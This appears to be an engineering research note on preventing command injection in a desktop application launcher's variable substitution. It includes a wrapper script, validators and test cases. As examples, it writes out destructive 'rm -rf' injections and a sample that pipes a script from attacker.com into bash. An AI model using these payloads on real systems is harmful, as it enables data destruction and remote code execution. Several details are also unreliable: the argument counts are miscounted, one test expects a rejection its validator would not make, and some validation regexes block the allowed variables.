# Research: Secure Variable Substitution for Application Launcher Commands

**Research Date**: 2025-10-24
**Context**: Feature 034 - Unified Application Launcher with Project Context
**Research Focus**: Secure variable substitution patterns to prevent command injection while handling edge cases

## Executive Summary

**CRITICAL SECURITY FINDING**: Direct string substitution with user-controlled or filesystem-derived variables (like `$PROJECT_DIR`) is **INHERENTLY UNSAFE** and creates command injection vulnerabilities. The safest approach is to avoid shell interpretation entirely by using argument arrays instead of shell command strings.

**Recommended Approach**: Use a **two-tier substitution system**:
1. **Build-time**: Generate desktop files with a launcher wrapper script
2. **Runtime**: Wrapper script passes variables as separate arguments (avoiding shell interpretation)

**Key Principle**: Never concatenate variables into shell command strings. Always pass them as separate arguments to avoid metacharacter interpretation.

---

## 1. Bash Parameter Expansion - Security Analysis

### The Core Problem

Bash parameter expansion (`"$VAR"`) is safe **only when**:
- The variable is passed as a **separate argument** to a command
- The entire argument is properly quoted with double quotes
- The command is invoked directly (not through a subshell)

**UNSAFE Pattern** (current registry design risk):
```bash
# ❌ VULNERABLE TO COMMAND INJECTION
COMMAND="code $PROJECT_DIR"  # If PROJECT_DIR contains "; rm -rf /"
eval "$COMMAND"              # Executes arbitrary commands
```

**SAFE Pattern** (recommended approach):
```bash
# ✅ SAFE - Variables as separate arguments
exec code "$PROJECT_DIR"     # Shell doesn't interpret $PROJECT_DIR contents
```

### Why Double Quotes Are Essential

From research findings:
> "If parameter/variable references are not enclosed in double-quotes, values are subject to word splitting and filename wildcard expansion."

**Example**:
```bash
PROJECT_DIR="/home/user/My Projects/nixos"

# ❌ WRONG - Unquoted variable
code $PROJECT_DIR
# Expands to: code /home/user/My Projects/nixos
# Shell sees 4 arguments: "/home/user/My", "Projects/nixos"

# ✅ CORRECT - Quoted variable
code "$PROJECT_DIR"
# Expands to single argument: "/home/user/My Projects/nixos"
```

### Shell Metacharacters That Break Unquoted Variables

**Characters requiring quoting**:
- Spaces (word splitting)
- `$` (variable expansion)
- `` ` `` (command substitution)
- `&` (background process)
- `;` (command separator)
- `|` (pipe)
- `>`, `<` (redirection)
- `*`, `?`, `[` (glob patterns)
- `(`, `)` (subshells)
- `{`, `}` (brace expansion)
- `!` (history expansion in interactive shells)
- `\` (escape character)
- `"` (quote delimiter)
- `'` (quote delimiter)

**Attack Example**:
```bash
# Malicious project directory name
PROJECT_DIR="/tmp/normal; rm -rf ~ #"

# If executed with eval or sh -c:
code $PROJECT_DIR
# Becomes: code /tmp/normal; rm -rf ~ #
# Result: Opens /tmp/normal, then DELETES HOME DIRECTORY
```

---

## 2. Command Injection Risks & Prevention

### Research Findings Summary

From security research:
> "Building shell command strings using data from untrusted sources is best avoided since it is very difficult to do securely."

**Key Insight**: Manual escaping is error-prone. Any missed special character is an attack vector.

### Attack Surface Analysis

**Untrusted/User-Controlled Data Sources**:
1. **Project directories**: User-defined paths from `~/.config/i3/projects/*.json`
2. **Project names**: User-chosen identifiers
3. **Session names**: Derived from project names
4. **Application registry parameters**: User-editable JSON file

**Vulnerability Scenario**:
```json
// User edits application-registry.json
{
  "name": "vscode",
  "command": "code",
  "parameters": "$PROJECT_DIR"
}

// User creates malicious project
{
  "name": "exploit",
  "directory": "/tmp/$(curl http://attacker.com/steal.sh | bash)"
}

// If launcher uses eval or sh -c:
eval "code /tmp/$(curl http://attacker.com/steal.sh | bash)"
// Result: Remote code execution
```

### Prevention Strategy: Avoid Shell Execution

**Recommended Approach** (from research):
> "Instead of invoking a shell, use standard libraries that provide the desired functionality."

**Python Example** (from research):
```python
# ❌ UNSAFE
os.system(f"code {project_dir}")

# ✅ SAFE - Argument array, no shell
subprocess.run(["code", project_dir], shell=False)
```

**Bash Equivalent**:
```bash
# ❌ UNSAFE - String concatenation
sh -c "code $PROJECT_DIR"

# ✅ SAFE - Direct execution with arguments
exec code "$PROJECT_DIR"
```

---

## 3. Special Character Handling & Edge Cases

### Test Cases for PROJECT_DIR

| Test Case | Path | Expected Behavior | Security Risk |
|-----------|------|-------------------|---------------|
| **Spaces** | `/home/user/My Projects/nixos` | Single argument to command | Word splitting if unquoted |
| **Dollar sign** | `/home/user/$projects/nixos` | Literal `$projects` in path | Variable expansion if unquoted |
| **Backtick** | `/home/user/\`cmd\`/nixos` | Literal backtick in path | Command substitution if unquoted |
| **Semicolon** | `/tmp/dir; rm -rf ~` | Should error (invalid path) | Command injection if eval'd |
| **Pipe** | `/tmp/dir \| curl evil.com` | Should error (invalid path) | Command injection if eval'd |
| **Ampersand** | `/tmp/dir & malware` | Should error (invalid path) | Background execution if eval'd |
| **Quotes** | `/home/user/"my dir"/nixos` | Literal quotes in path | Quote escaping issues |
| **Newline** | `/tmp/dir\nrm -rf ~` | Should error (invalid path) | Multi-command injection |
| **Null byte** | `/tmp/dir\x00` | Should error (invalid path) | Null byte injection |
| **Unicode** | `/home/user/日本語/nixos` | UTF-8 path preserved | Encoding issues |

### Validation Strategy

**Pre-Launch Validation**:
```bash
#!/usr/bin/env bash
# Validate project directory before substitution

validate_project_dir() {
    local dir="$1"

    # Must be absolute path
    [[ "$dir" = /* ]] || return 1

    # Must exist and be a directory
    [[ -d "$dir" ]] || return 1

    # Must not contain newlines (filesystem allows but suspicious)
    [[ "$dir" = *$'\n'* ]] && return 1

    # Must not contain null bytes (always invalid)
    [[ "$dir" = *$'\0'* ]] && return 1

    return 0
}
```

### Desktop File Escaping Rules

From freedesktop.org specification:
> "Arguments may be quoted in whole. If an argument contains a reserved character the argument must be quoted."

**Desktop File Reserved Characters**:
- Space (must quote entire argument)
- `"` (escape as `\"`)
- `` ` `` (escape as `\``)
- `$` (escape as `\$`)
- `\` (escape as `\\`)

**Desktop File Example**:
```ini
[Desktop Entry]
Name=VS Code
# ❌ WRONG - Unescaped variable in Exec
Exec=code $PROJECT_DIR

# ✅ CORRECT - Use wrapper script
Exec=/etc/nixos/scripts/app-launcher-wrapper.sh vscode
```

**Why Wrapper Script**:
Desktop files are parsed once at desktop environment startup. Variables like `$PROJECT_DIR` are dynamic (change with active project). Therefore, the Exec line must call a **runtime wrapper** that queries the daemon and substitutes variables at launch time.

---

## 4. Secure Substitution Pattern (Recommended Implementation)

### Architecture Overview

```
┌─────────────────┐
│ Desktop File    │  Static, generated by home-manager
│ Exec=wrapper.sh │  Contains only app name (no variables)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Wrapper Script  │  Runtime variable substitution
│ - Query daemon  │  Bash script with validation
│ - Validate vars │
│ - Exec command  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Application     │  Receives clean arguments
│ (e.g., code)    │  No shell interpretation
└─────────────────┘
```

### Wrapper Script Implementation

```bash
#!/usr/bin/env bash
# app-launcher-wrapper.sh
# Secure variable substitution for application launcher

set -euo pipefail

APP_NAME="${1:?Missing application name}"
shift  # Remaining args passed to application

# Load application registry
REGISTRY_FILE="${HOME}/.config/i3/application-registry.json"
[[ -f "$REGISTRY_FILE" ]] || {
    notify-send "Launcher Error" "Registry not found: $REGISTRY_FILE"
    exit 1
}

# Get application definition
APP_DEF=$(jq -r --arg name "$APP_NAME" \
    '.[] | select(.name == $name)' "$REGISTRY_FILE")

[[ -n "$APP_DEF" ]] || {
    notify-send "Launcher Error" "Application not found: $APP_NAME"
    exit 1
}

# Extract fields
COMMAND=$(echo "$APP_DEF" | jq -r '.command')
PARAMETERS=$(echo "$APP_DEF" | jq -r '.parameters // ""')
SCOPE=$(echo "$APP_DEF" | jq -r '.scope // "global"')

# Query daemon for project context (if scoped app)
if [[ "$SCOPE" == "scoped" ]]; then
    PROJECT_JSON=$(i3pm project current 2>/dev/null || echo "{}")
    PROJECT_DIR=$(echo "$PROJECT_JSON" | jq -r '.directory // ""')
    PROJECT_NAME=$(echo "$PROJECT_JSON" | jq -r '.name // ""')

    # Validate project directory
    if [[ -n "$PROJECT_DIR" ]] && [[ ! -d "$PROJECT_DIR" ]]; then
        notify-send "Launcher Warning" \
            "Project directory not found: $PROJECT_DIR\nLaunching in global mode"
        PROJECT_DIR=""
    fi
else
    PROJECT_DIR=""
    PROJECT_NAME=""
fi

# Build argument array (NO STRING SUBSTITUTION)
ARGS=()

# Add base command
ARGS+=("$COMMAND")

# Substitute variables in parameters (if any)
if [[ -n "$PARAMETERS" ]]; then
    # Replace $PROJECT_DIR with actual value
    PARAM_RESOLVED="${PARAMETERS//\$PROJECT_DIR/$PROJECT_DIR}"
    # Replace $PROJECT_NAME with actual value
    PARAM_RESOLVED="${PARAM_RESOLVED//\$PROJECT_NAME/$PROJECT_NAME}"

    # Only add parameter if value is non-empty
    if [[ -n "$PARAM_RESOLVED" ]] && [[ "$PARAM_RESOLVED" != "$PARAMETERS" ]]; then
        ARGS+=("$PARAM_RESOLVED")
    fi
fi

# Add any extra arguments passed to wrapper
ARGS+=("$@")

# Log launch for debugging
logger -t app-launcher "Launching: ${ARGS[*]} (project: ${PROJECT_NAME:-global})"

# Execute command with arguments as array (SAFE - no shell interpretation)
exec "${ARGS[@]}"
```

**Security Properties**:
1. ✅ Uses `"${ARGS[@]}"` - Preserves spaces and special characters
2. ✅ No `eval`, `sh -c`, or string concatenation
3. ✅ Variables passed as separate arguments
4. ✅ Pre-validated project directory
5. ✅ Logs all launches for audit trail
6. ✅ User-friendly error messages

### Alternative: Using printf %q for Escaping

From research:
> "GNU printf can create an escaped version of variables, with %q printing in a format that can be reused as shell input."

**Example**:
```bash
# Escape variable for safe shell use
SAFE_DIR=$(printf %q "$PROJECT_DIR")

# Now safe to use in eval (but still avoid eval if possible)
eval "code $SAFE_DIR"
```

**Limitations**:
- GNU-specific (not POSIX portable)
- Still requires eval (which we're avoiding)
- Adds complexity when array approach is simpler

---

## 5. Best Practices from .desktop File Specification

### freedesktop.org Desktop Entry Spec Summary

**Quoting Rules** (from specification):
> "Arguments are separated by a space. Arguments may be quoted in whole. If an argument contains a reserved character the argument must be quoted."

**Escape Characters**:
> "Quoting must be done by enclosing the argument between double quotes and escaping the double quote character, backtick character (`` ` ``), dollar sign (`$`) and backslash character (`\`) by preceding it with an additional backslash character."

**Examples**:
```ini
# Literal backslash
Exec=cmd "foo\\bar"     # Represents: foo\bar

# Literal dollar sign
Exec=cmd "value\\$5"    # Represents: value$5

# Four backslashes for literal backslash in quoted arg
Exec=cmd "path\\\\"     # Represents: path\
```

**Field Code Escaping**:
> "Literal percentage characters must be escaped as %%."

```ini
# Correct percentage escaping
Exec=cmd --percent=100%%   # Represents: --percent=100%
```

### Important Constraint

From specification:
> "Implementations must take care not to expand field codes into multiple arguments unless explicitly instructed by this specification. This means that name fields, filenames and other replacements that can contain spaces must be passed as a single argument to the executable program after expansion."

**Implication**: Desktop environments handle argument quoting automatically when expanding field codes like `%f` (single file). Our wrapper script must do the same for our custom variables.

### Field Codes We're NOT Using

The spec defines field codes like `%f` (file), `%u` (URL), `%i` (icon). We're **not** using these because:
1. We're passing **directory paths**, not files selected by user
2. Our variables are dynamic (active project), not static
3. Wrapper script provides more flexibility than field codes

---

## 6. Validation Rules for Registry Entries

### Allowed Variable Syntax

**Permitted Variables**:
```json
{
  "parameters": "$PROJECT_DIR"           // ✅ Single variable
  "parameters": "--work-tree=$PROJECT_DIR"  // ✅ Variable in option value
  "parameters": "$PROJECT_DIR/subdir"    // ✅ Variable with path suffix
  "parameters": "-n $SESSION_NAME"       // ✅ Variable as option argument
}
```

**Forbidden Patterns**:
```json
{
  "parameters": "$(malicious command)"   // ❌ Command substitution
  "parameters": "`rm -rf ~`"            // ❌ Backtick command substitution
  "parameters": "${PROJECT_DIR:-/tmp}"  // ❌ Parameter expansion (too complex)
  "parameters": "$PROJECT_DIR; rm -rf"  // ❌ Command separator
  "parameters": "$PROJECT_DIR | curl"   // ❌ Pipe operator
  "parameters": "$PROJECT_DIR && evil"  // ❌ Logical operator
}
```

### Registry Schema Validation

**JSON Schema Addition**:
```json
{
  "properties": {
    "parameters": {
      "type": "string",
      "pattern": "^[^;|&`$(){}]*\\$[A-Z_]+[^;|&`$(){}]*$",
      "description": "Command parameters with allowed variables: $PROJECT_DIR, $PROJECT_NAME, $SESSION_NAME. No shell metacharacters (;|&`$(){})"
    }
  }
}
```

**Validation Function**:
```typescript
// Deno CLI validation (in i3pm apps validate)
function validateParameters(params: string): string[] {
  const errors: string[] = [];

  // Check for command substitution
  if (params.includes('$(') || params.includes('`')) {
    errors.push("Command substitution not allowed: $() or `");
  }

  // Check for command separators
  if (/[;|&]/.test(params)) {
    errors.push("Shell operators not allowed: ; | &");
  }

  // Check for allowed variables only
  const vars = params.match(/\$[A-Z_]+/g) || [];
  const allowed = ['$PROJECT_DIR', '$PROJECT_NAME', '$SESSION_NAME', '$WORKSPACE'];
  const invalid = vars.filter(v => !allowed.includes(v));

  if (invalid.length > 0) {
    errors.push(`Invalid variables: ${invalid.join(', ')}. Allowed: ${allowed.join(', ')}`);
  }

  return errors;
}
```

---

## 7. Testing Strategy & Test Cases

### Unit Tests (Bash Script)

```bash
#!/usr/bin/env bash
# test-variable-substitution.sh

# Test 1: Spaces in path
PROJECT_DIR="/home/user/My Projects/nixos"
ARGS=("code" "$PROJECT_DIR")
# Expected: code receives 1 argument with spaces preserved

# Test 2: Dollar sign in path
PROJECT_DIR="/home/user/\$projects/nixos"
ARGS=("code" "$PROJECT_DIR")
# Expected: Literal $ passed to code

# Test 3: Empty variable (global mode)
PROJECT_DIR=""
ARGS=("code")
[[ -n "$PROJECT_DIR" ]] && ARGS+=("$PROJECT_DIR")
# Expected: code receives no directory argument

# Test 4: Special characters (quotes, backslash)
PROJECT_DIR="/home/user/\"quoted\"/path"
ARGS=("code" "$PROJECT_DIR")
# Expected: Literal quotes passed to code

# Test 5: Multiple variables
PROJECT_DIR="/etc/nixos"
SESSION_NAME="nixos-session"
ARGS=("ghostty" "-e" "sesh" "connect" "$SESSION_NAME")
# Expected: All arguments preserved
```

### Integration Tests (User Scenarios)

**Test Case 1: Project-aware VS Code launch**
```bash
# Setup
i3pm project switch nixos

# Action
xdg-open vscode.desktop  # Or launch from rofi

# Expected
# 1. Wrapper queries daemon: i3pm project current
# 2. Gets: {"name": "nixos", "directory": "/etc/nixos"}
# 3. Executes: code "/etc/nixos"
# 4. VS Code opens in /etc/nixos

# Validation
pgrep -a code | grep "/etc/nixos"
```

**Test Case 2: Global mode fallback**
```bash
# Setup
i3pm project clear  # No active project

# Action
xdg-open vscode.desktop

# Expected
# 1. Wrapper queries daemon: i3pm project current
# 2. Gets: {"name": null}
# 3. Executes: code (no directory argument)
# 4. VS Code opens in default mode

# Validation
pgrep -a code | grep -v "/etc/nixos"
```

**Test Case 3: Malicious project directory**
```bash
# Setup
mkdir -p "/tmp/test; rm -rf ~"
cat > ~/.config/i3/projects/exploit.json <<EOF
{
  "name": "exploit",
  "directory": "/tmp/test; rm -rf ~",
  "icon": ""
}
EOF
i3pm project switch exploit

# Action
xdg-open vscode.desktop

# Expected
# 1. Wrapper validates directory exists
# 2. Directory validation FAILS (invalid characters)
# 3. Launcher shows error: "Invalid project directory"
# 4. VS Code does NOT launch
# 5. Home directory remains intact

# Validation
[[ -d "$HOME" ]] && echo "✅ Home directory safe"
```

---

## 8. Implementation Recommendations

### Tier 1: Minimal Viable Approach (Safest)

**Strategy**: Avoid all variable substitution in shell commands. Use fixed application commands only.

**Implementation**:
```json
// application-registry.json
{
  "name": "vscode",
  "command": "code",
  "parameters": "",  // NO VARIABLES
  "scope": "scoped"
}
```

**Wrapper Script**:
```bash
# Pass project directory as first argument (application decides what to do)
exec "$COMMAND" "$PROJECT_DIR" "$@"
```

**Pros**:
- ✅ No command injection risk
- ✅ Simple implementation
- ✅ Applications handle paths natively

**Cons**:
- ❌ Limited flexibility (can't customize argument format)
- ❌ Doesn't work for apps needing `--option=value` format

---

### Tier 2: Restricted Variable Substitution (Recommended)

**Strategy**: Allow variable substitution but only in **validated, isolated positions**.

**Implementation**:
```json
{
  "name": "lazygit",
  "command": "ghostty",
  "parameters": "-e lazygit --work-tree=$PROJECT_DIR",
  "scope": "scoped"
}
```

**Wrapper Script** (from Section 4):
```bash
# Use bash string replacement (safe for validated variables)
PARAM_RESOLVED="${PARAMETERS//\$PROJECT_DIR/$PROJECT_DIR}"

# Build argument array
ARGS=("$COMMAND")
[[ -n "$PARAM_RESOLVED" ]] && ARGS+=("$PARAM_RESOLVED")

# Execute safely
exec "${ARGS[@]}"
```

**Validation** (pre-flight check):
```bash
# Validate parameters field matches allowed pattern
if [[ "$PARAMETERS" =~ [;\|\&\`\$\(\)] ]]; then
    echo "ERROR: Invalid characters in parameters" >&2
    exit 1
fi
```

**Pros**:
- ✅ Supports custom argument formats
- ✅ Validated before execution
- ✅ Maintains safety through whitelisting

**Cons**:
- ⚠️ Requires careful validation implementation
- ⚠️ More complex than Tier 1

---

### Tier 3: Full Shell Evaluation (NOT RECOMMENDED)

**Strategy**: Use `eval` or `sh -c` for maximum flexibility.

**Implementation**:
```bash
# ❌ DANGEROUS - DO NOT USE
eval "$COMMAND $PARAMETERS"
```

**Why Rejected**:
- ❌ High command injection risk
- ❌ Difficult to validate all edge cases
- ❌ Manual escaping is error-prone
- ❌ Violates security best practices

**Never use this approach.**

---

## 9. Comparison with Other Launcher Systems

### rofi (dmenu replacement)

**How rofi handles arguments**:
- Reads .desktop files directly
- Uses XDG Desktop Entry specification
- **Does not** support custom variable substitution
- Field codes (`%f`, `%u`) are predefined and safe

**Lesson**: Desktop file field codes are safe because they're **predefined and validated** by the desktop environment. We're creating custom variables, so we must validate ourselves.

---

### dmenu / fzf launchers

**How they handle arguments**:
- User types arbitrary command
- Executed directly via `sh -c` or `eval`
- **Assumes trusted user input**

**Example** (from `/etc/nixos/scripts/fzf-launcher.sh`):
```bash
COMMAND="$SELECTED"
exec i3-msg -q "exec --no-startup-id $COMMAND"
```

**Security Model**:
- User is trusted (typing commands manually)
- No variable substitution
- Direct execution

**Lesson**: Trust model is different. fzf launcher trusts user input. Our registry launcher must **not trust** registry contents (user-editable JSON file).

---

### systemd service files

**How systemd handles variables**:
```ini
[Service]
ExecStart=/usr/bin/code %h/projects
# %h = home directory (systemd-defined variable)
```

**systemd variable safety**:
- Predefined variables only (`%h`, `%n`, `%i`)
- No arbitrary variable names
- No user-defined substitution
- Validated by systemd parser

**Lesson**: Restrict our variable set to predefined names (`$PROJECT_DIR`, `$PROJECT_NAME`) and validate them explicitly.

---

## 10. Final Recommendations

### Primary Recommendation: Tier 2 (Restricted Substitution)

**Why**:
1. Balances flexibility with security
2. Supports required use cases (e.g., `--work-tree=$PROJECT_DIR`)
3. Validation is feasible and maintainable
4. Follows industry best practices (argument arrays)

**Implementation Checklist**:
- [ ] Define whitelist of allowed variables (`$PROJECT_DIR`, `$PROJECT_NAME`, `$SESSION_NAME`)
- [ ] Add JSON schema validation for `parameters` field (no metacharacters)
- [ ] Implement wrapper script with argument array execution
- [ ] Pre-validate project directory exists and is absolute path
- [ ] Log all launches with resolved commands
- [ ] Add error messages for invalid configurations
- [ ] Test all edge cases (spaces, special chars, empty values)

---

### Validation Rules Summary

**Required Validations**:
1. **Registry load time** (Deno CLI):
   - `parameters` field matches regex: `^[^;|&\`$(){}]*$` (no shell operators)
   - Only allowed variables: `$PROJECT_DIR`, `$PROJECT_NAME`, `$SESSION_NAME`
   - Command exists in PATH or is absolute path

2. **Launch time** (Wrapper script):
   - Project directory is absolute path (starts with `/`)
   - Project directory exists and is a directory
   - No newlines or null bytes in paths
   - Variables resolve to non-empty values (or skip parameter)

3. **Build time** (home-manager):
   - Desktop file Exec line calls wrapper script (no inline variables)
   - Icon files exist
   - No conflicting .desktop file names

---

### Security Guarantees

**What This Approach Prevents**:
- ✅ Command injection via semicolons, pipes, ampersands
- ✅ Command substitution via `$()` or backticks
- ✅ Variable expansion attacks via unquoted variables
- ✅ Path traversal (validated absolute paths only)
- ✅ Arbitrary code execution via `eval`

**What This Approach Does NOT Prevent** (Out of Scope):
- ❌ User intentionally registering malicious applications (e.g., `"command": "rm -rf ~"`)
  - *Mitigation*: Document that registry is trusted configuration (like i3 config)
- ❌ Symlink attacks (project directory is symlink to `/`)
  - *Mitigation*: Could add symlink resolution check if needed
- ❌ TOCTOU race conditions (directory exists check → launch)
  - *Mitigation*: Acceptable risk (directory unlikely to disappear in <100ms)

---

## 11. References

### Web Search Results

1. **Bash Parameter Expansion & Security**
   - Source: Unix StackExchange, Security StackExchange
   - Key Finding: Always quote variables with double quotes (`"$VAR"`)
   - Key Finding: Avoid `eval` and `sh -c` with untrusted data

2. **freedesktop.org Desktop Entry Specification**
   - URL: https://specifications.freedesktop.org/desktop-entry-spec/latest/
   - Key Finding: Escape reserved characters in desktop file Exec lines
   - Key Finding: Arguments with spaces must be quoted

3. **Shell Command Injection Prevention**
   - Source: OWASP, Secure Programming HOWTO
   - Key Finding: Use argument arrays instead of string concatenation
   - Key Finding: Whitelist allowed input when possible

### Code References

1. **Current Launch Scripts**:
   - `/etc/nixos/scripts/launch-code.sh` - Uses `exec code "$PROJECT_DIR"` (safe)
   - `/etc/nixos/scripts/launch-ghostty.sh` - Uses `exec ghostty -e bash -c "..."` (less safe, but controlled)

2. **Related Features**:
   - Feature 015: i3pm daemon (provides `i3pm project current` API)
   - Feature 024/031: Window rules system (uses WM_CLASS patterns)

### Additional Reading

- GNU Bash Manual: Parameter Expansion
- POSIX Shell Command Language Specification
- OWASP: Command Injection Prevention Cheat Sheet
- systemd.service(5): ExecStart variable substitution

---

## Appendix A: Complete Wrapper Script Example

See Section 4 for the full implementation.

**Key Properties**:
- Uses `"${ARGS[@]}"` for safe argument passing
- Validates project directory before substitution
- Logs all launches for debugging
- Provides user-friendly error messages
- No `eval`, `sh -c`, or string concatenation

---

## Appendix B: Test Matrix

| Test Case | Input | Expected Output | Security Check |
|-----------|-------|-----------------|----------------|
| Normal path | `/etc/nixos` | `code "/etc/nixos"` | ✅ No injection |
| Spaces | `/home/user/My Projects` | `code "/home/user/My Projects"` | ✅ Single argument |
| Dollar sign | `/tmp/$dir` | `code "/tmp/$dir"` | ✅ Literal $ |
| Semicolon | `/tmp; rm -rf ~` | **ERROR** (invalid path) | ✅ Rejected |
| Pipe | `/tmp | curl` | **ERROR** (invalid path) | ✅ Rejected |
| Command sub | `$(malicious)` | **ERROR** (validation fails) | ✅ Rejected |
| Empty | `` (no project) | `code` (no arg) | ✅ Graceful fallback |
| Missing dir | `/nonexistent` | **ERROR** (dir not found) | ✅ Validation fails |

---

**END OF RESEARCH DOCUMENT**
